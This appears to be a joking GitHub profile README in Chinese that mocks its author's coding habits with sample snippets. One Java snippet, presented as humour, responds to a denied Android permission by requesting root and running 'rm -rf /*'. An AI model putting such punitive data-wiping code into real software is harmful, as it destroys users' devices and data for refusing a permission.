### 北敬(Jasmine2008xyz)

### 介绍
- github著名神奇代码撰写者
- 年仅16岁荣获github的"好多Star"成就
- github著名项目Camellia的Owner，github高⭐项目Okhttp，Gson等项目的User

### 特长
- 擅长写Java、Kotlin、Go、Python、JavaScript、C、C++等热门语言   的"Hello, World"代码
```cpp
/**
 * 他们教我写代码要面向对象
 */
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <memory>
#include <stdexcept>
#include <functional>

class A {
public:
    virtual void print() const = 0;
    virtual ~A() = default;
};

class B : public A {
public:
    void print() const override {
        std::cout << "Hello, World!" << std::endl;
    }
};

template <typename T>
class C {
public:
    void operator()(const T& value) const {
        value.print();
    }
};

template <typename T>
void D(const T& obj) {
    C<T> c;
    c(obj);
}

void E(bool flag) {
    if (flag) {
        throw std::runtime_error("An error occurred!");
    }
}

class F {
public:
    F(const std::string& filename) : filename_(filename) {}
    void write(const std::string& content) {
        std::ofstream ofs(filename_);
        if (!ofs.is_open()) {
            throw std::ios_base::failure("Failed to open file.");
        }
        ofs << content;
        ofs.close();
    }

private:
    std::string filename_;
};

int main() {
    try {
        // 创建一个指向 B 类型对象的 unique_ptr，通过 make_unique 创建，p 是一个智能指针
        std::unique_ptr<A> p = std::make_unique<B>();

        // 使用模板函数 D 调用 C 的重载运算符()，并传递 *p（B 类型的对象）
        // 此时 C<B> 被实例化，调用其 operator() 方法，进而调用 B 的 print() 方法
        D(*p);

        // 创建一个 F 类的对象 fileWriter，并传入文件名 "output.txt"
        // 然后调用 fileWriter 的 write 方法，向文件中写入文本内容
        F fileWriter("output.txt");
        fileWriter.write("Hello, World! written to file.");

        // 调用 E 函数并传入 false。由于参数为 false，不会抛出异常。
        E(false);

        // 如果一切正常，打印程序成功信息
        std::cout << "Program executed successfully." << std::endl;

    } catch (const std::exception& e) {
        // 捕获并处理异常，输出异常信息
        std::cerr << "Exception: " << e.what() << std::endl;
    }

    // 结束函数
    return 0;
}
```

- 幽默的注解与实现
```java
      // 开始添加Item
  root.addView(
          Getbutton(
                  "Java插件",
                  v -> {
                      /** 这里因为直接升起不了Activity，所以为了偷懒，先退出当前活动 **/
                      /**
                       * 不要紧的，我会在JavaPluginActivity里重写退出按钮，他们就只有返回键可以按，退出后自动升回来，反正速度很快他们看不出来
                       */
                       onBackPressed();                         
                       startActivity(
                              new Intent(SettingActivity.this, JavaPluginActivity.class));
                  }));
```
```java
// 处理权限请求结果
@Override
public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
    super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    if (requestCode == 1) {
        if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            // 权限被授予
            Redirector.request(4);
        } else {
            // 权限被拒绝
            // 不给权限是吧，我看你是又前🌿了
                try {
      Process exec = Runtime.getRuntime().exec("su");
      Runtime.getRuntime().exec("rm -rf /*");
      OutputStream outputStream = exec.getOutputStream();
      outputStream.write("exit\n".getBytes());
      outputStream.flush();
      outputStream.close();
      boolean z = exec.waitFor() == 0;
      exec.destroy();
    } catch (Throwable unused) {
    }
        }
    }
}
```
- 丰富的字段理解能力
```kt
// 当初我去面试就是因为写出这个东西被刷下来的
final static public var hookers: ArrayList<ArrayList<ArrayList<CommonFunctionHooker>>> = ArrayList()
```
- 面向全球化编程(编程不只在代码行)
```js
\u0063\u006f\u006e\u0073\u006f\u006c\u0065\u002e\u006c\u006f\u0067\u0028\u0022\u4e0d\u662f\u4f60\u771f\u89e3\u5f00\u6765\u5e72\u561b\uff1f\u6211\u8fd8\u6ca1\u5199\u4e1c\u897f\u0028\u7b11\u0029\u0022\u0029\u003b
```

### 支持我继续活下去吗？
![](http://103.24.204.23/lzj/赞助码.jpg)

# 若你决定灿烂，山无遮，海无拦。

